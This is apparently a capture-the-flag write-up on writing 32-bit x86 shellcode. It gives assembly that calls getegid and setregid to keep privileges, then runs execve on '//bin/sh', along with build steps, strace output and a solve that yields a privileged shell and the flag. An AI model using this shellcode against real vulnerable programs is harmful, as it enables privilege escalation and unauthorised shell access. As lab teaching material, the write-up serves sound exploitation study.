# Writing Shellcode
This is going to be an overview of a handful of the shellcode-based challenges
rather than for just one, as they're similar and more of a stepping stone to 
controlling processes than the be-all and end-all. 

The general goal of these challenges is to write shellcode to
result in the following:
```c
int egid = getegid();
setregid(egid, egid);
execve('/bin/sh', 0, 0);
```

## Compiling
```make
make 32:
        gcc -m32 -c -o shellcode.o shellcode.S && \
        gcc -o shellcode shellcode.o -m32 && \
        objcopy -S -O binary -j .text shellcode.o shellcode.bin

make 64:
        gcc -m64 -c -o shellcode.o shellcode.S && \
        gcc -o shellcode shellcode.o -m64 && \
        objcopy -S -O binary -j .text shellcode.o shellcode.bin
```

The binary took `shellcode.bin` and used it to run our code, and then we had a privileged shell
that would allow us to get the flag. 

# 32bit
## shellcode-32
For this challenge, we just had to write any 32bit shellcode that would accomplish the goal. 
All this required was the general system call calling conventions. THe first call is the 
easiest as it doesn't have any arguments. We just have to get the call number into %eax
and then use `int 0x80` to make the call. 

```gas
#include <sys/syscall.h>

.globl main
.type main, @function

#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    mov $SYS_getegid, %eax
    int $0x80
```

When calling `setregid()` we have to pass the result of the previous call as
arguments. In IE32 the first few arguments are passed in `%ebx`, `%ecx`, and `%edx`. As usual, the
result of the previous call is in `%eax`. 

```gas
    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    mov $SYS_setregid, %eax
    int $0x80
```

When calling `execve` we need to input our string. To do this, the string has to be 
somewhere in memory. The easiest way to do that is to push it onto the stack. As we do this,
however, we need to keep in mind the length of the string. We push 4 bytes onto the stack at
one time, and our string is only 7 bytes. In order to rectify this, we can add an additional 
`/` to the beginning of the string to pad it out to 8 bytes without changing how it will run. 
We also need to push our null byte. 

```gas
    // ececve("/bin/sh", 0, 0)
    push $0
    push $0x68732f6e
    push $0x69622f2f
    mov $SYS_execve, %eax
    mov %esp, %ebx
    mov $0, %ecx
    mov $0, %edx
    int $0x80
```

After we compile our code, we can use `strace` to make sure that functions
are being called the way we want them to. 

```
$ strace ./shellcode
...
getegid()                               = 1019
setregid(1019, 1019)                    = 0
execve("//bin/sh", NULL, NULL)          = 0
...
```

### Full Script + Solving
```gas
#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    mov $SYS_getegid, %eax
    int $0x80

    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    mov $SYS_setregid, %eax
    int $0x80

    // ececve("/bin/sh", 0, 0)
    push $0
    push $0x68732f6e
    push $0x69622f2f
    mov $SYS_execve, %eax
    mov %esp, %ebx
    mov $0, %ecx
    mov $0, %edx
    int $0x80
```
```
$ ./shellcode-32
Reading shellcode from shellcode.bin

$ cat flag
cand{execve_bin_sh}
```


